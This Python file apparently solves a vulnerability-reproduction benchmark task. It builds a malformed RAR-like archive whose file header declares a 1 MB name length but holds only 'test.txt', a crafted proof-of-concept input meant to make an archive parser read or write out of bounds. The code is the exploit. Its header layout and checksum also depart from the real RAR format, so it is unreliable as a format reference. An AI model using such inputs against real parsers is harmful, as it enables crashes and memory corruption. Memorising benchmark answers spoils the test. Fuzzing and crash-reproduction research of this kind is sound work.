def crc16(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) & 0xFFFF) ^ 0x1021
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'Rar!\x05\x00\x00\x00'
        # Main header
        body_main = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        header_size_main = 8 + len(body_main)
        size_main = header_size_main.to_bytes(4, 'little')
        content_main = b'\x00\x40' + size_main + body_main
        crc_main = crc16(content_main)
        header_main = crc_main.to_bytes(2, 'little') + content_main
        # File header
        fixed_body = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        fixed_body += b'\x00\x00\x00\x00\x00'
        fixed_body += b'\x20\x00\x00\x00\x03\x30\x00'
        # len(fixed_body) == 24
        offset = 8 + 24
        large_name_size = 0x100000
        header_size_file = offset + large_name_size
        size_file = header_size_file.to_bytes(4, 'little')
        content_file = b'\x01\x00' + size_file + fixed_body
        crc_file = crc16(content_file)
        header_file = crc_file.to_bytes(2, 'little') + content_file
        # Short name part
        name_part = b'test.txt'
        poc = signature + header_main + header_file + name_part
        return poc
